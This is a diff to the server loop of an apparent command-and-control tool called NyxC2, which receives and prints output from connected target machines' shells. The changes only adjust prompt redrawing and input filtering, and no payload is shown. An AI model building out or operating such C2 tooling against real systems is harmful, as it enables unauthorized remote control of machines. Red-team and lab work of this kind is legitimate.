@@ -74,26 +74,28 @@ def server():
                         break
                 try:
                     new_data = elem.recv(4096)
+                    
                     if not new_data:
                         print(f"connection lost with {nom_cible}")
+                        print("\nNyxC2 > ", end="", flush=True)
                         server_list.remove(elem)
                         if nom_cible in dict_ip:
                             del dict_ip[nom_cible]
                         elem.close()
                     else:
                         new_data = new_data.decode('cp850', errors='replace').strip()
-                        if ">" in new_data:
-                            new_data = ""
                             
                         if new_data:
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
+                        if new_data.endswith('>'):
+                            print("\nNyxC2 > ", end="", flush=True)
                 except ConnectionResetError:
                     print(f"connection brutally interrupted with {nom_cible}")
                     if nom_cible in dict_ip:
                             del dict_ip[nom_cible]
                     server_list.remove(elem)
                     elem.close()
-                print("NyxC2 > ", end="", flush=True)
+                    print("NyxC2 > ", end="", flush=True)
                     
                 
 
